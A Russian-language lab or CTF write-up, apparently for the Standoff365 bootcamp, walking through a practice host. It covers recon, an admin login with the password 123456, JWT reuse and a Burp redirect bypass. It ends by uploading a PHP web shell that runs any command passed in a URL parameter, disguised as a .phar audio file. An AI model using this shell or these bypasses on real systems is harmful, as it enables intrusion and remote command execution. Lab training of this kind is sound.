---
attack: jwt
---
Платформа :  [[Ответы решений заданий/Standoff/Bootcamp standoff365]]

- [[#hint1|hint1]]
- [[#hint2|hint2]]
- [[#hint3|hint3]]
- [[#nmap|nmap]]
- [[#bypass redirect via jwt token|bypass redirect via jwt token]]
- [[#bypass redirect via burp|bypass redirect via burp]]
- [[#Роботы на подработке|Роботы на подработке]]
- [[#Руками|Руками]]

 

#### The train of thought
 
В процессе работы с машинками были обнаружены каталоги. В одном из каталогов находился файл аутентификации. Отправив данные на нужный URL, мы получили токен.
Затем нам нужно было выяснить, куда вставить этот токен. После тщательного изучения веб-интерфейса мы нашли страницу(обе страницы в каталоге sevret\secret ), которая перенаправляет нас на стартовую страницу. Этот редирект можно обойти двумя способами:
1. Использование токена.

После этого мы получили функцию загрузки файлов. В дальнейшем, используя либо ручные методы, либо автоматизированные инструменты, мы смогли получить обратный шелл (revshell).
#### Skills
Обучение навыкам:

2. Поиск и нахождение файлов для аутентификации в формате Json  и добавлении их при входе на другую страницу 

#### Impression of the solution | Впечатление от решения
Нашел довольно интересный инструмент для php upload , надеюсь он меня не подведет на дальнейших  заданиях 

---

#### Hint from site | Hint from me  

#### nmap 
Проводим стартовую разведку

Из портов на сайте нет ничего интересного 
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1720/tcp open  h323q931

```

direcoty через feroxbuster не нашёл ничего интересного 
```
http://10.124.1.241/secret/
http://10.124.1.241/index.php
http://10.124.1.241/styles/
http://10.124.1.241/uploads/
http://10.124.1.241/js/
```

Роботы говорят
```
User-agent: *
Disallow: /secret/
Disallow: /core/
Disallow: /uploads/
```

#### redirect 
Далее как  обойти редирект на странице `http://10.124.1.241/secret/uploadMusic.php`

Варианты:
1. Получаем и меняем либо в браузере наш токен и обновляем страницу после переходим на   secret/secretPanel.php или http://10.124.1.241/secret/uploadMusic.php
2. Перехватываем запрос в бюрпе через Proxy -> Intercept -> intercept is off -> меняем ответ от сервера 
 Далее будет процесс уязвимости php upload
#### bypass redirect via jwt token 
через перебор каталогов находим 
> http://10.124.1.241/js/

Cтоит обратить внимание на следующий файлик. 
>http://10.124.1.241/js/auth.js 

Из него можно выписать следующие php файлы 
1. сore/userLogin.php
2. secret/secretPanel.php

Из  файла auth.js я увидел поля ввода данных ,а  вводить нужно в core/userLogin.php
Далее чуть чуть причесал(добавил отправку данных в формате  JSON ) запрос 
И только хотел начать  перебор паролей , как на   123456 все подошло 
```
POST /core/userLogin.php HTTP/1.1
Host: 10.124.1.241
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: pma_lang=en; phpMyAdmin=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQG11c2ljay5jb20iLCJpc3MiOiJsb2NhbGhvc3QiLCJhdWQiOiJsb2NhbGhvc3QiLCJpYXQiOjE3Mjc0NDYzMTUsImV4cCI6MTcyNzQ0OTkxNX0.1wjbTxu7rX-cLp6xX_asq7Ki4BzfD4IQChZSBKea3dM; 
Upgrade-Insecure-Requests: 1
Content-Length: 53

{
   "username": "admin",
   "password":"123456"
}

```

В ответ на этот запрос я получил jwt token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQG11c2ljay5jb20iLCJpc3MiOiJsb2NhbGhvc3QiLCJhdWQiOiJsb2NhbGhvc3QiLCJpYXQiOjE3Mjc0NDYzMTUsImV4cCI6MTcyNzQ0OTkxNX0.fFS_sVBsE1Xgby-9edtjByHPkq-AAmeZ_rfV5SzIKXU

Проверим через сайт  начинку токена (site: https://jwt.io/) , увидел что токен Админский значит : ~~можем~~  нужно его куда-нибудь подставить

Берем нежно наш токен , чтобы пока несли не сломался 
и идем в 
10.124.1.241/secret


#### bypass redirect via burp (Не обязательно  )
Второй способ обойти редирект.
Перехватываем запрос к secretPanel  ; в burp -> Do intercept ->Response to this request 
Нажимаем Forward
![[Pasted image 20240926213245.png]]
Когда нам придёт ответ от сервера (Именно от сервера) 

Варианты:
1. Меняем  либо ответ с 302 на 200
   HTTP/1.0 302 Found    ->  HTTP/1.0 200
2. либо удаляем следующий заголовок  Location: /index.php

#### После обхода 
мы  получили страничку где можем загружать файлы , почему бы нам что нибудь да не загрузить?


#### Роботы на подработке 
Решил проверить эффективность следующего инструмента 
https://github.com/sAjibuu/Upload_Bypass?tab=readme-ov-file
Пример команды для перебора
> python upload_bypass.py -r test -s 'file has been uploaded' -E php -D /uploads --burp_http --exploit 

Содержимое файла test, было изменено  в зависимости от документации 
https://github.com/sAjibuu/Upload_Bypass?tab=readme-ov-file#example-2
```
POST /secret/uploadMusic.php HTTP/1.1
Host: 10.124.1.241
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------20454028017691591591771889877
Content-Length: 178827
Origin: http://10.124.1.241
DNT: 1
Connection: keep-alive
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQG11c2ljay5jb20iLCJpc3MiOiJsb2NhbGhvc3QiLCJhdWQiOiJsb2NhbGhvc3QiLCJpYXQiOjE3Mjc0NjA5MzcsImV4cCI6MTcyNzQ2NDUzN30.Twzf56dfM2tXd6ZDWfA35Xt_so3nXWHiZGHhBg6n9aw
Upgrade-Insecure-Requests: 1

-----------------------------20454028017691591591771889877
Content-Disposition: form-data; name="userfile"; filename="*filename*"
Content-Type: *mimetype*

*data*
-----------------------------20454028017691591591771889877
Content-Disposition: form-data; name="upload_btn"

Upload
-----------------------------20454028017691591591771889877--
```
#### Руками
В процессе поиска нашёл вот такую забавную штуку 
https://owasp.org/www-chapter-pune/meetups/2023/Jan/File-upload-Vulnerability-Praveen-Sutar.pptx.pdf

PHAR (PHP Archive) — это формат, который позволяет упаковывать файлы PHP и другие ресурсы в один архив, что облегчает распространение и использование приложений. PHAR-файлы могут содержать PHP-код, библиотеки, изображения и другие ресурсы, что делает их удобными для развертывания.

- **Исполняемость**: PHAR-файлы могут быть исполняемыми. Это означает, что вы можете запускать их как обычные скрипты PHP.

Запрос При перехвате в burp 
```
POST /secret/uploadMusic.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Host: 10.124.1.241
Content-Type: multipart/form-data; boundary=---------------------------20454028017691591591771889877
Content-Length: 706
Origin: http://10.124.1.241
DNT: 1
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQG11c2ljay5jb20iLCJpc3MiOiJsb2NhbGhvc3QiLCJhdWQiOiJsb2NhbGhvc3QiLCJpYXQiOjE3Mjc0NjA5MzcsImV4cCI6MTcyNzQ2NDUzN30.Twzf56dfM2tXd6ZDWfA35Xt_so3nXWHiZGHhBg6n9aw
Upgrade-Insecure-Requests: 1

-----------------------------20454028017691591591771889877
Content-Disposition: form-data; name="userfile"; filename="bob.phar"
Content-Type: audio/mpeg

<?php
    $output = null;
    $retval = null;

    if(isset($_GET['cmd'])) {
        // Capture the output and return value of the system command
        exec($_GET['cmd'], $output, $retval);
    }

    // Output the captured output
    if(is_array($output)) {
        foreach($output as $line) {
            echo $line . "\n";
        }
    }
?>

-----------------------------20454028017691591591771889877
Content-Disposition: form-data; name="upload_btn"

Upload
-----------------------------20454028017691591591771889877--

```